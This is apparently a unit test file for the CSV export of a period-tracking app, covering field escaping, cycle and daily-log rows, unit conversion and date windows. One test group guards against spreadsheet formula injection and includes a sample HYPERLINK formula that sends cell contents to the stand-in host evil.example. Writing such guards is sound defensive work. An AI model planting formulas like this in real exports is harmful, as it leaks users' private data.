/// Unit tests for RFC 4180 CSV export builders and helpers (Issue #469).
library;

import 'package:flutter_test/flutter_test.dart';
import 'package:lunarlog/domain/export/csv_export.dart';
import 'package:lunarlog/domain/export/fhir_export_range.dart';
import 'package:lunarlog/domain/models/day_entry.dart';
import 'package:lunarlog/domain/models/flow_level.dart';
import 'package:lunarlog/domain/models/local_date.dart';
import 'package:lunarlog/domain/models/measurement_unit.dart';
import 'package:lunarlog/domain/models/observation.dart';
import 'package:lunarlog/domain/models/observation_category.dart';

DayEntry _entry({
  required String id,
  required LocalDate date,
  FlowLevel flow = FlowLevel.medium,
  bool pms = false,
  List<String> tags = const [],
  String? note,
  DateTime? deletedAt,
}) =>
    DayEntry(
      id: id,
      profileId: 'p1',
      localDate: date,
      tz: 'UTC',
      flow: flow,
      pms: pms,
      tags: tags,
      note: note,
      deletedAt: deletedAt,
      updatedAt: DateTime.utc(2026, 1, 1),
    );

Observation _observation({
  required String id,
  required LocalDate date,
  required ObservationCategory category,
  String? code,
  double? valueNum,
  String? unit,
  int? intensity,
  DateTime? deletedAt,
}) =>
    Observation(
      id: id,
      dayEntryId: 'e-$date',
      profileId: 'p1',
      localDate: date,
      tz: 'UTC',
      category: category,
      code: code,
      valueNum: valueNum,
      unit: unit,
      intensity: intensity,
      deletedAt: deletedAt,
      updatedAt: DateTime.utc(2026, 4, 1),
    );

void main() {
  group('escapeCsvField', () {
    test('passes through plain alphanumeric text unmodified', () {
      expect(escapeCsvField('hello world'), 'hello world');
      expect(escapeCsvField('12345'), '12345');
      expect(escapeCsvField(''), '');
    });

    test('encloses in quotes when comma is present', () {
      expect(escapeCsvField('cramps, bloating'), '"cramps, bloating"');
    });

    test('escapes double quotes and encloses in quotes', () {
      expect(escapeCsvField('she said "hello"'), '"she said ""hello"""');
    });

    test('encloses in quotes when newline is present', () {
      expect(escapeCsvField('line 1\nline 2'), '"line 1\nline 2"');
      expect(escapeCsvField('line 1\r\nline 2'), '"line 1\r\nline 2"');
    });
  });

  group('escapeCsvField: Issue #563 formula-injection guard', () {
    void expectGuarded(String input) {
      expect(escapeCsvField(input), "\"'$input\"", reason: input);
    }

    test('a field starting with = is prefixed with an apostrophe and '
        'force-quoted', () => expectGuarded('=1+1'));

    test('a field starting with + is prefixed with an apostrophe and '
        'force-quoted', () => expectGuarded('+1+1'));

    test('a field starting with - is prefixed with an apostrophe and '
        'force-quoted', () => expectGuarded('-1+1'));

    test('a field starting with @ is prefixed with an apostrophe and '
        'force-quoted', () => expectGuarded('@SUM(A1:A9)'));

    test('a field starting with a tab is prefixed with an apostrophe and '
        'force-quoted', () => expectGuarded('\t=1+1'));

    test('a field starting with a bare CR is prefixed with an apostrophe '
        'and force-quoted', () => expectGuarded('\r=1+1'));

    test('a field that also needs RFC 4180 quoting (embedded comma and '
        'quotes) is still just single-apostrophe-prefixed and quoted once',
        () {
      const formula = '=HYPERLINK("https://evil.example/?x="&A1&B1,"Open")';
      expect(
        escapeCsvField(formula),
        '"\'=HYPERLINK(""https://evil.example/?x=""&A1&B1,""Open"")"',
      );
    });

    test('an ordinary field starting with a harmless character is '
        'untouched (no leading apostrophe added when there is nothing to '
        'guard against)', () {
      expect(escapeCsvField('normal text'), 'normal text');
      expect(escapeCsvField('2026-03-01'), '2026-03-01');
    });

    test('Issue #563: a value legitimately starting with "-" is still '
        'guarded — a deliberate, documented trade-off, not an oversight. '
        'It is safe for this exporter because none of its numeric columns '
        'can legitimately be negative: bbt/weight are physical '
        'measurements (always positive), and every other numeric column '
        'is a non-negative count or an ISO date', () {
      expectGuarded('-97.8');
    });
  });

  group('formatCsvRow and formatCsvTable', () {
    test('formats row with comma separation and escapes fields', () {
      final row = formatCsvRow(['2026-03-01', 'heavy', 'cramps, bad']);
      expect(row, '2026-03-01,heavy,"cramps, bad"');
    });

    test('formats table with CRLF line endings', () {
      final table = formatCsvTable([
        ['col1', 'col2'],
        ['val1', 'val2'],
      ]);
      expect(table, 'col1,col2\r\nval1,val2\r\n');
    });

    test('empty rows return empty string', () {
      expect(formatCsvTable([]), '');
    });
  });

  group('filename helpers', () {
    test('csvCyclesFileName formats as lunarlog-cycles-YYYY-MM-DD.csv in UTC', () {
      expect(
        csvCyclesFileName(DateTime.utc(2026, 3, 5, 14, 30)),
        'lunarlog-cycles-2026-03-05.csv',
      );
      expect(
        csvCyclesFileName(DateTime.utc(2026, 11, 25)),
        'lunarlog-cycles-2026-11-25.csv',
      );
    });

    test('csvDailyLogFileName formats as lunarlog-daily-log-YYYY-MM-DD.csv in UTC', () {
      expect(
        csvDailyLogFileName(DateTime.utc(2026, 3, 5, 14, 30)),
        'lunarlog-daily-log-2026-03-05.csv',
      );
    });
  });

  group('buildCyclesCsv', () {
    test('empty entries produces header only', () {
      final csv = buildCyclesCsv(entries: const <DayEntry>[]);
      expect(
        csv,
        'cycle_number,start_date,end_date,cycle_length_days,period_length_days,is_irregular,omitted_from_averages\r\n',
      );
    });

    test('single bleeding episode generates open cycle with empty end_date and cycle_length_days', () {
      final entries = [
        _entry(id: 'e1', date: LocalDate(2026, 3, 1), flow: FlowLevel.heavy),
        _entry(id: 'e2', date: LocalDate(2026, 3, 2), flow: FlowLevel.medium),
        _entry(id: 'e3', date: LocalDate(2026, 3, 3), flow: FlowLevel.light),
      ];

      final csv = buildCyclesCsv(entries: entries);
      final lines = csv.split('\r\n');
      expect(lines.length, 3); // header, cycle 1, empty trailing line
      expect(lines[1], '1,2026-03-01,,,3,false,false');
    });

    test('multiple episodes generate completed cycles and open cycle with irregularity detection', () {
      final entries = [
        // Cycle 1: starts March 1, 4-day period
        _entry(id: 'e1', date: LocalDate(2026, 3, 1), flow: FlowLevel.heavy),
        _entry(id: 'e2', date: LocalDate(2026, 3, 2), flow: FlowLevel.medium),
        _entry(id: 'e3', date: LocalDate(2026, 3, 3), flow: FlowLevel.light),
        _entry(id: 'e4', date: LocalDate(2026, 3, 4), flow: FlowLevel.light),

        // Cycle 2: starts March 29 (28-day cycle, normal)
        _entry(id: 'e5', date: LocalDate(2026, 3, 29), flow: FlowLevel.medium),
        _entry(id: 'e6', date: LocalDate(2026, 3, 30), flow: FlowLevel.light),

        // Cycle 3: starts April 5 (7-day cycle, irregular short < 15 days)
        _entry(id: 'e7', date: LocalDate(2026, 4, 5), flow: FlowLevel.heavy),

        // Cycle 4: starts June 15 (71-day cycle, irregular long > 60 days)
        _entry(id: 'e8', date: LocalDate(2026, 6, 15), flow: FlowLevel.heavy),
      ];

      final csv = buildCyclesCsv(
        entries: entries,
        omittedCycleStarts: {LocalDate(2026, 4, 5)},
      );

      final lines = csv.split('\r\n');
      expect(lines[0], 'cycle_number,start_date,end_date,cycle_length_days,period_length_days,is_irregular,omitted_from_averages');
      // Cycle 1: 2026-03-01 to 2026-03-28 (28 days, regular, not omitted)
      expect(lines[1], '1,2026-03-01,2026-03-28,28,4,false,false');
      // Cycle 2: 2026-03-29 to 2026-04-04 (7 days, irregular short, not omitted)
      expect(lines[2], '2,2026-03-29,2026-04-04,7,2,true,false');
      // Cycle 3: 2026-04-05 to 2026-06-14 (71 days, irregular long, omitted)
      expect(lines[3], '3,2026-04-05,2026-06-14,71,1,true,true');
      // Cycle 4 (open): starts 2026-06-15, empty end date and cycle length, not irregular
      expect(lines[4], '4,2026-06-15,,,1,false,false');
    });
  });

  group('buildDailyLogCsv', () {
    test('empty entries and observations produces header only', () {
      final csv = buildDailyLogCsv(entries: const <DayEntry>[], observations: const <Observation>[]);
      expect(
        csv,
        'date,flow,pms,tags,pain_intensity,spotting,notes,bbt,bbt_unit,weight,weight_unit\r\n',
      );
    });

    test('ignores deleted entries and observations', () {
      final entries = [
        _entry(
          id: 'e1',
          date: LocalDate(2026, 4, 1),
          deletedAt: DateTime.utc(2026, 4, 2),
        ),
      ];
      final obs = [
        _observation(
          id: 'o1',
          date: LocalDate(2026, 4, 1),
          category: ObservationCategory.spotting,
          deletedAt: DateTime.utc(2026, 4, 2),
        ),
      ];

      final csv = buildDailyLogCsv(entries: entries, observations: obs);
      expect(
        csv,
        'date,flow,pms,tags,pain_intensity,spotting,notes,bbt,bbt_unit,weight,weight_unit\r\n',
      );
    });

    test('issue #847: an unrecognised category drives no spotting/pain/'
        'measurement branch', () {
      final entries = [
        _entry(id: 'e1', date: LocalDate(2026, 4, 1)),
      ];
      final obs = [
        _observation(
          id: 'o1',
          date: LocalDate(2026, 4, 1),
          category: ObservationCategory.custom('mood'),
          code: 'anxious',
          intensity: 5,
        ),
      ];

      final csv = buildDailyLogCsv(entries: entries, observations: obs);
      final row = csv.split('\r\n')[1].split(',');

      // date,flow,pms,tags,pain_intensity,spotting,...
      expect(row[4], isEmpty, reason: 'not a pain row');
      expect(row[5], 'false', reason: 'not a spotting row');
      expect(row[7], isEmpty, reason: 'not a bbt row');
      expect(row[9], isEmpty, reason: 'not a weight row');
    });

    test('serializes complete daily log with tags, pain intensity, spotting, '
        'bbt, and weight — units normalized to the (default metric) display '
        'preference and carried in their own columns (Issue #612, LLA-093)',
        () {
      final entries = [
        _entry(
          id: 'e1',
          date: LocalDate(2026, 4, 1),
          flow: FlowLevel.heavy,
          pms: true,
          tags: ['cramps', 'fatigue'],
          note: 'Heavy flow today, took ibuprofen.',
        ),
        _entry(
          id: 'e2',
          date: LocalDate(2026, 4, 2),
          flow: FlowLevel.spotting,
          note: 'Light spotting\nwith note',
        ),
      ];

      final obs = [
        _observation(
          id: 'o1',
          date: LocalDate(2026, 4, 1),
          category: ObservationCategory.pain,
          code: 'pelvic',
          intensity: 4,
        ),
        _observation(
          id: 'o2',
          date: LocalDate(2026, 4, 1),
          category: ObservationCategory.bbt,
          valueNum: 36.5,
          unit: 'celsius',
        ),
        _observation(
          id: 'o3',
          date: LocalDate(2026, 4, 1),
          category: ObservationCategory.weight,
          valueNum: 61.5,
          unit: 'kg',
        ),
        // Observation without an entry on 2026-04-03:
        _observation(
          id: 'o4',
          date: LocalDate(2026, 4, 3),
          category: ObservationCategory.spotting,
        ),
      ];

      final csv = buildDailyLogCsv(entries: entries, observations: obs);
      final lines = csv.split('\r\n');

      expect(lines[0],
          'date,flow,pms,tags,pain_intensity,spotting,notes,bbt,bbt_unit,weight,weight_unit');
      // 2026-04-01: heavy, pms=true, tags=cramps;fatigue, pelvic:4, spotting=false, notes quoted because of comma, bbt=36.5 celsius (unchanged: already the default display unit), weight=61.5 kg
      expect(lines[1],
          '2026-04-01,heavy,true,cramps;fatigue,pelvic:4,false,"Heavy flow today, took ibuprofen.",36.5,celsius,61.5,kg');
      // 2026-04-02: spotting, pms=false, spotting=true, notes quoted because of newline
      expect(lines[2], '2026-04-02,spotting,false,,,true,"Light spotting\nwith note",,,,');
      // 2026-04-03: entry is null so flow is none, spotting is true from observation
      expect(lines[3], '2026-04-03,none,false,,,true,,,,,');
    });

    group('unit normalization (Issue #612, LLA-093)', () {
      test('a Fahrenheit bbt row normalizes to Celsius when the profile '
          'displays Celsius (the default)', () {
        final obs = [
          _observation(
            id: 'o1',
            date: LocalDate(2026, 4, 1),
            category: ObservationCategory.bbt,
            valueNum: 98.6, // 37.0°C
            unit: 'fahrenheit',
          ),
        ];
        final csv = buildDailyLogCsv(entries: const [], observations: obs);
        final lines = csv.split('\r\n');
        final fields = lines[1].split(',');
        // bbt, bbt_unit columns (indices 7, 8).
        expect(double.parse(fields[7]), closeTo(37.0, 0.01));
        expect(fields[8], 'celsius');
      });

      test('two rows logged in DIFFERENT units both normalize to the same '
          'display unit — mixed-unit history no longer produces '
          'indistinguishable numbers in the same column', () {
        final obs = [
          _observation(
            id: 'o1',
            date: LocalDate(2026, 4, 1),
            category: ObservationCategory.bbt,
            valueNum: 36.5,
            unit: 'celsius',
          ),
          _observation(
            id: 'o2',
            date: LocalDate(2026, 4, 2),
            category: ObservationCategory.bbt,
            valueNum: 98.6, // also 36.5-ish °C once converted
            unit: 'fahrenheit',
          ),
        ];
        final csv = buildDailyLogCsv(
          entries: const [],
          observations: obs,
          bbtUnit: BbtUnit.celsius,
        );
        final lines = csv.split('\r\n');
        final day1Bbt = double.parse(lines[1].split(',')[7]);
        final day2Bbt = double.parse(lines[2].split(',')[7]);
        expect(day1Bbt, 36.5);
        expect(day2Bbt, closeTo(37.0, 0.01));
        expect(lines[1].split(',')[8], 'celsius');
        expect(lines[2].split(',')[8], 'celsius');
      });

      test('a Fahrenheit-display profile normalizes a Celsius-logged bbt '
          'row into Fahrenheit', () {
        final obs = [
          _observation(
            id: 'o1',
            date: LocalDate(2026, 4, 1),
            category: ObservationCategory.bbt,
            valueNum: 37.0,
            unit: 'celsius',
          ),
        ];
        final csv = buildDailyLogCsv(
          entries: const [],
          observations: obs,
          bbtUnit: BbtUnit.fahrenheit,
        );
        final lines = csv.split('\r\n');
        final fields = lines[1].split(',');
        expect(double.parse(fields[7]), closeTo(98.6, 0.1));
        expect(fields[8], 'fahrenheit');
      });

      test('a pound-logged weight row normalizes to kilograms when the '
          'profile displays kilograms (the default)', () {
        final obs = [
          _observation(
            id: 'o1',
            date: LocalDate(2026, 4, 1),
            category: ObservationCategory.weight,
            valueNum: 135.5,
            unit: 'lb',
          ),
        ];
        final csv = buildDailyLogCsv(entries: const [], observations: obs);
        final lines = csv.split('\r\n');
        final fields = lines[1].split(',');
        // weight, weight_unit columns (indices 9, 10).
        expect(double.parse(fields[9]), closeTo(61.46, 0.01));
        expect(fields[10], 'kg');
      });

      test('an unrecognised or missing unit is never silently coerced to '
          'the display default: the raw value passes through unconverted, '
          'and the unit column names the row\'s own raw unit (or stays '
          'empty when null) rather than a guessed one', () {
        final obs = [
          _observation(
            id: 'o1',
            date: LocalDate(2026, 4, 1),
            category: ObservationCategory.bbt,
            valueNum: 97.8,
            unit: null,
          ),
          _observation(
            id: 'o2',
            date: LocalDate(2026, 4, 2),
            category: ObservationCategory.weight,
            valueNum: 12.3,
            unit: 'stone', // not one of the closed set
          ),
        ];
        final csv = buildDailyLogCsv(entries: const [], observations: obs);
        final lines = csv.split('\r\n');
        final day1 = lines[1].split(',');
        expect(day1[7], '97.8');
        expect(day1[8], ''); // no raw unit to report
        final day2 = lines[2].split(',');
        expect(day2[9], '12.3');
        expect(day2[10], 'stone'); // named, not fabricated as kg
      });
    });
  });

  group('Issue #115 G3: range window', () {
    // Four single-day bleeding episodes, 40 days apart — the newest is the
    // open cycle. A window starting after the first start must drop exactly
    // that first row from BOTH builders.
    final starts = [
      LocalDate(2025, 1, 1),
      LocalDate(2025, 2, 10),
      LocalDate(2025, 3, 22),
      LocalDate(2025, 5, 1),
    ];
    List<DayEntry> episodes() => [
      for (var i = 0; i < starts.length; i++)
        _entry(id: 'r$i', date: starts[i]),
    ];
    final window = customFhirExportRange(
      start: LocalDate(2025, 2, 1),
      end: LocalDate(2025, 12, 31),
    );

    test('buildCyclesCsv keeps only episodes whose start is inside the '
        'window, renumbers them contiguously, and still resolves each '
        'included cycle against the full history', () {
      final csv = buildCyclesCsv(entries: episodes(), range: window);
      final lines = csv.split('\r\n');

      // header + three included cycles (Feb/Mar/May) + trailing blank line.
      expect(lines.length, 5);
      expect(lines[1], '1,2025-02-10,2025-03-21,40,1,false,false');
      expect(lines[2], '2,2025-03-22,2025-04-30,40,1,false,false');
      // The newest episode is the open cycle — no end/length.
      expect(lines[3], '3,2025-05-01,,,1,false,false');
      expect(csv, isNot(contains('2025-01-01')),
          reason: 'a start before the window must not be exported');
    });

    test('buildDailyLogCsv trims the day rows to the same window boundary',
        () {
      final csv = buildDailyLogCsv(
        entries: episodes(),
        observations: [
          // A spotting observation on an excluded day must go too: the
          // window is applied to the merged date set, not only to entries.
          _observation(
            id: 'o1',
            date: LocalDate(2025, 1, 1),
            category: ObservationCategory.spotting,
          ),
        ],
        range: window,
      );

      expect(csv, isNot(contains('2025-01-01')));
      expect(csv, contains('2025-02-10'));
      expect(csv, contains('2025-05-01'));
    });

    test('a null range and FhirExportRange.everything are byte-identical and '
        'still whole-history — the pre-#115 default is unchanged', () {
      final entries = episodes();
      expect(
        buildCyclesCsv(entries: entries, range: FhirExportRange.everything),
        buildCyclesCsv(entries: entries),
      );
      expect(
        buildDailyLogCsv(
          entries: entries,
          range: FhirExportRange.everything,
        ),
        buildDailyLogCsv(entries: entries),
      );
      expect(buildCyclesCsv(entries: entries), contains('2025-01-01'));
    });
  });
}
